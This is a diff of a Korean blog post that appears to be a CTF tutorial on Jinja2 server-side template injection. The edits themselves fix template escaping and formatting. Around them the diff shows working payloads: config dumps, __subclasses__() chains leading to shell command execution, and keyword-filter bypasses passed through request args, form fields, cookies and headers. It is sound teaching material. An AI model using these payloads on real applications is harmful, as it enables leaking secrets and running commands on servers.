@@ -90,7 +90,7 @@ CTF 에서 주로 사용되는 방식은?
 보통 CTF 에서 flag.txt를 추출하기위한 아주 기초적인 방법으로는 config 파일을 확인하면 되므로 아래와 같이 사용된다.
 
     ```c++
-    http://uri~~/?name={ {config} }
+    http://uri~~/?name={{config}}
     ``` 
 {% endraw %}
 ![그림 1-5](/assets/image/vuln/web-vuln/Server%20Side%20Template%20Injection%20(SSTI)/image-4.png)
@@ -117,10 +117,11 @@ http://uri~~/?name={{''.__class__.__base__}}
 > object 클래스는 클래스의 최상위에 존재하는 클래스이며, 그 하위에 여러 클래스들이 존재하며 str도 하위 클래스에 포함된다. 즉 ''.__class__ 를 통해 str클래스에 접근 후 .__base__를 통해 그 상위 클래스인 object에 접근한 것이다.
 
 앞에서 object가 최상위 클래스 라고 설명했다. 그렇다면 트리형식으로 뻗어있는 클래스들이 존재할 테니 object의 하위 클래스들 목록을 확인하여야한다. 이 때 .__subclasses__() 를 사용할 수 있다.
-
+{% raw %}
 ```
 http://uri~~/?name={{''.__class__.__base__.__subclasses__()}}
 ```
+{% endraw %}
 
 여기까지 성공하였다면, object 클래스 하위의 모든 클래스 목록을 dict 형식으로 받게된다.
 여기서 공격자가 원하는 클래스를 선택하여 적절한 Payload를 구성하면된다.
@@ -152,7 +153,7 @@ http://uri~~/?name={{''.__class__.__base__.__subclasses__()[351]('ls',shell=True
 mro 또한 객체가 상속받은 클래스 목록을 확인할 수 있으며,
 <br><br>
 
-**<u style=color:"red">base와 mro의 차이점은 직접 상속받은 클래스의 튜플이냐 모든 클래스의 튜플이냐의 차이이다.</u>**
+**<u style="color:red;">base와 mro의 차이점은 직접 상속받은 클래스의 튜플이냐 모든 클래스의 튜플이냐의 차이이다.</u>**
 
 > 이 외에도 Jinja2 웹 템플릿 엔진에서 사용되는 Payload는 무척 많으며, 각 상황에 맞게 적절하게 만들어 사용하여야 한다.
 {% raw %}
@@ -204,8 +205,8 @@ dict.__mro__[-1]
 {{ self|attr("__dict__") }}
 {{ self|attr("con"+"fig")}}
 {{ self.__getitem__('con'+'fig') }}
-{{ request.__dict__ } }
-{{ request['__dict__']} }
+{{ request.__dict__ }}
+{{ request['__dict__']}}
 {{ request.__getitem__('con'+'fig') }}
 ```
 {% endraw %}
@@ -230,13 +231,14 @@ http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,req
 ```
 
 ### 모든 키워드가 막혔을 시 rqeuest 객가 Filtering 안되었다면?
-
+{% raw %}
 ```python
 <http://127.0.0.1:8080/?c=>{{ request|attr(request.args.get('class')|attr(request.args.get('mro'))|attr(request.args.get('getitem'))(1) }}&class=__class__&mro=__mro__&getitem=__getitem__
 <http://127.0.0.1:8080?c=>{{ request|attr(request.form.get('class'))|attr(request.form.get('mro'))|attr(request.form.get('getitem'))(1) }}
 <http://127.0.0.1:8080?c=>{{ request|attr(request.cookies.get('class'))|attr(request.cookies.get('mro'))|attr(request.cookies.get('getitem'))(1) }}
 <http://127.0.0.1:8080?c=>{{ request|attr(request.headers.get('class'))|attr(request.headers.get('mro'))|attr(request.headers.get('getitem'))(1) }}
 ```
+{% endraw %}
 {% raw %}
 ## {{}} Filtering → {% %}
 ```python
